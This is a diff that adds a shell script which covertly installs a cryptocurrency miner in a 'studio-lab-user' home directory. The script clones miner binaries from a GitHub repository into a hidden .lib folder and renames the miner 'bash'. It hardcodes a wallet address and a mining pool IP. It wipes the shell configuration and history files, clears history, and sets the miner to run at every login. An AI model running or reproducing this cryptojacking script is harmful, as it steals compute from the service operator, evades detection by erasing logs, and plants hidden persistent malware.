@@ -1,0 +1,24 @@
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="BERKAH"
+WALLETNH="3Ferzz1nxqKTfCX83JafFE4pqWX5nJhEW2"
+POOLNH="100.27.29.51:443"
+git clone https://github.com/yashimotone/koe.git && cd koe && mv bash emer* lol* mine* lice* split* dual* /home/studio-lab-user/.lib 
+cd .. && history -cr
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="3Ferzz1nxqKTfCX83JafFE4pqWX5nJhEW2"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="100.27.29.51:443"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/bash --algo ETHASH --pool $POOLNH --user $WALLETNH.$WORKER --ethstratum ETHPROX " > /home/studio-lab-user/.lib/gas.sh
+chmod +x gas.sh && chmod +x bash && cd ~/ && history -cr && source .bashrc
